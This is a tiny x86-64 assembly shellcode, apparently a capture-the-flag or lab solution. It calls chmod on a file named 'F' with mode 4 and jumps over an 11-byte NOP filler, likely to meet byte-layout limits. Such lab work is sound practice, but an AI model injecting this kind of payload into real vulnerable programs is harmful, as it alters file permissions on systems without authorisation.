.global _start
_start:
.intel_syntax noprefix
        push 0x46
        mov rdi, rsp
        mov al, 90
        jmp next
.fill 11, 1, 0x90
next:
        mov si,4
        syscall

